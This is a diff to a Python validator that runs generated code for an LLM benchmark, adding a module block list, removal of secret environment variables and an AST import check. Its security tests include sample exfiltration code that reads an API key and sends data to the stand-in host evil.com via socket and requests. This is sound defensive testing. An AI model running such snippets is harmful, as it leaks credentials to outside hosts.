@@ -5,14 +5,103 @@ Code Validator for LLM Benchmark
 Validates generated code by actually executing it with test cases.
 Supports Python, JavaScript, and SQL (keyword validation only).
 
-Security: All code execution is done in isolated subprocesses with timeouts.
+Security measures:
+- All code execution in isolated subprocesses with timeouts (3s default)
+- Dangerous Python modules blocked (os, subprocess, socket, etc.)
+- Environment variables sanitized (API keys not accessible)
+- Network access blocked via module restrictions
+
+Note: This provides defense-in-depth for controlled benchmarking scenarios.
+For production untrusted code execution, use containerized sandboxes (Docker/gVisor).
 """
 
 import ast
+import os
 import re
 import subprocess
-import tempfile
 from typing import Optional
+
+
+# --- Security Configuration ---
+
+# Python modules to block (prevents file/network/system access)
+BLOCKED_PYTHON_MODULES = {
+    # System/process access
+    'os', 'subprocess', 'sys', 'signal', 'resource',
+    # Network access
+    'socket', 'requests', 'urllib', 'http', 'httpx', 'aiohttp',
+    'ftplib', 'smtplib', 'telnetlib', 'ssl', 'websocket',
+    # File system access
+    'shutil', 'pathlib', 'glob', 'tempfile', 'io',
+    # Serialization (code execution risk)
+    'pickle', 'shelve', 'marshal',
+    # Dynamic imports
+    'importlib', 'imp',
+    # Low-level / dangerous
+    'ctypes', 'multiprocessing', 'threading', 'asyncio', 'concurrent',
+    'pwd', 'grp', 'pty', 'tty', 'termios', 'fcntl', 'pipes',
+    'posix', 'posixpath', 'nt', 'ntpath', '_thread',
+    # Code execution
+    'code', 'codeop', 'compile', 'exec', 'eval',
+}
+
+# Environment variables to remove before execution (protects API keys)
+SANITIZED_ENV_VARS = [
+    'OPENAI_API_KEY', 'ANTHROPIC_API_KEY', 'GOOGLE_API_KEY',
+    'AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'AWS_SESSION_TOKEN',
+    'GITHUB_TOKEN', 'GITLAB_TOKEN', 'NPM_TOKEN',
+    'DATABASE_URL', 'SUPABASE_URL', 'SUPABASE_KEY',
+    'SECRET_KEY', 'API_KEY', 'AUTH_TOKEN', 'PASSWORD',
+]
+
+
+def get_sanitized_env() -> dict:
+    """Return environment dict with sensitive variables removed."""
+    env = os.environ.copy()
+    for var in SANITIZED_ENV_VARS:
+        env.pop(var, None)
+    # Also remove any variable containing 'KEY', 'SECRET', 'TOKEN', 'PASSWORD'
+    sensitive_patterns = ['KEY', 'SECRET', 'TOKEN', 'PASSWORD', 'CREDENTIAL']
+    keys_to_remove = [k for k in env if any(p in k.upper() for p in sensitive_patterns)]
+    for k in keys_to_remove:
+        env.pop(k, None)
+    return env
+
+
+def check_for_dangerous_imports(code: str) -> Optional[str]:
+    """
+    Statically analyze code for dangerous imports using AST.
+    
+    Returns the name of a blocked module if found, None if safe.
+    This is done BEFORE execution to prevent any dangerous code from running.
+    """
+    try:
+        tree = ast.parse(code)
+    except SyntaxError:
+        return None  # Syntax errors handled elsewhere
+    
+    for node in ast.walk(tree):
+        # Check 'import X' statements
+        if isinstance(node, ast.Import):
+            for alias in node.names:
+                module_name = alias.name.split('.')[0]
+                if module_name in BLOCKED_PYTHON_MODULES:
+                    return module_name
+        
+        # Check 'from X import Y' statements
+        elif isinstance(node, ast.ImportFrom):
+            if node.module:
+                module_name = node.module.split('.')[0]
+                if module_name in BLOCKED_PYTHON_MODULES:
+                    return module_name
+        
+        # Check for dangerous built-in calls: eval(), exec(), compile(), __import__()
+        elif isinstance(node, ast.Call):
+            if isinstance(node.func, ast.Name):
+                if node.func.id in ('eval', 'exec', 'compile', '__import__', 'open'):
+                    return node.func.id
+    
+    return None
 
 
 # --- Code Extraction ---
@@ -85,12 +174,22 @@ def validate_python_syntax(code: str) -> bool:
 
 def test_python_code(code: str, prompt: str) -> bool:
     """
-    Execute Python code with test cases using subprocess.
+    Execute Python code with test cases in a security-hardened subprocess.
+    
+    Security measures applied:
+    - Static AST analysis blocks dangerous imports BEFORE execution
+    - Environment sanitized (API keys removed from subprocess)
+    - 3-second timeout prevents runaway execution
     
     Returns True if all tests pass.
     """
     if not code or not validate_python_syntax(code):
         return False
+    
+    # SECURITY: Check for dangerous imports BEFORE execution
+    blocked_module = check_for_dangerous_imports(code)
+    if blocked_module:
+        return False  # Reject code that imports dangerous modules
     
     # Determine test cases based on prompt
     test_script = None
@@ -182,13 +281,14 @@ else:
 print("PASS")
 '''
     
-    # Execute in subprocess
+    # Execute in subprocess with sanitized environment
     try:
         result = subprocess.run(
             ["python3", "-c", test_script],
             capture_output=True,
             text=True,
             timeout=3,
+            env=get_sanitized_env(),  # Remove API keys from environment
         )
         return "PASS" in result.stdout
     except subprocess.TimeoutExpired:
@@ -272,13 +372,14 @@ if (passed >= 3) {{
 console.log("PASS");
 '''
     
-    # Execute with Node.js
+    # Execute with Node.js (with sanitized environment)
     try:
         result = subprocess.run(
             ["node", "-e", test_script],
             capture_output=True,
             text=True,
             timeout=3,
+            env=get_sanitized_env(),  # Remove API keys from environment
         )
         return "PASS" in result.stdout
     except subprocess.TimeoutExpired:
@@ -370,6 +471,8 @@ if __name__ == "__main__":
     # Test the validator
     print("Testing code validator...\n")
     
+    print("=== Functional Tests ===")
+    
     # Test Python palindrome
     python_palindrome = '''
 ```python
@@ -420,4 +523,55 @@ LIMIT 5;
 '''
     result = check_code_accuracy(sql_query, "Write a SQL query to find the top 5 customers by total order value from tables 'customers' and 'orders'.")
     print(f"SQL query: {'✓ PASS' if result else '✗ FAIL'}")
+    
+    print("\n=== Security Tests ===")
+    
+    # Test that os module is blocked
+    malicious_os = '''
+```python
+import os
+def get_secret():
+    return os.environ.get('OPENAI_API_KEY', 'not found')
+print(get_secret())
+```
+'''
+    result = check_code_accuracy(malicious_os, "Write a Python function")
+    print(f"Blocked os import: {'✓ BLOCKED' if not result else '✗ ALLOWED (security fail!)'}")
+    
+    # Test that subprocess is blocked
+    malicious_subprocess = '''
+```python
+import subprocess
+def run_cmd():
+    return subprocess.run(['whoami'], capture_output=True).stdout
+```
+'''
+    result = check_code_accuracy(malicious_subprocess, "Write a Python function")
+    print(f"Blocked subprocess: {'✓ BLOCKED' if not result else '✗ ALLOWED (security fail!)'}")
+    
+    # Test that socket is blocked
+    malicious_socket = '''
+```python
+import socket
+def exfiltrate(data):
+    s = socket.socket()
+    s.connect(('evil.com', 80))
+    s.send(data.encode())
+```
+'''
+    result = check_code_accuracy(malicious_socket, "Write a Python function")
+    print(f"Blocked socket: {'✓ BLOCKED' if not result else '✗ ALLOWED (security fail!)'}")
+    
+    # Test that requests is blocked
+    malicious_requests = '''
+```python
+import requests
+def steal_keys():
+    return requests.post('https://evil.com', data={'key': 'stolen'})
+```
+'''
+    result = check_code_accuracy(malicious_requests, "Write a Python function")
+    print(f"Blocked requests: {'✓ BLOCKED' if not result else '✗ ALLOWED (security fail!)'}")
+    
+    print("\n✓ Security hardening active: dangerous modules blocked, env sanitized")
 
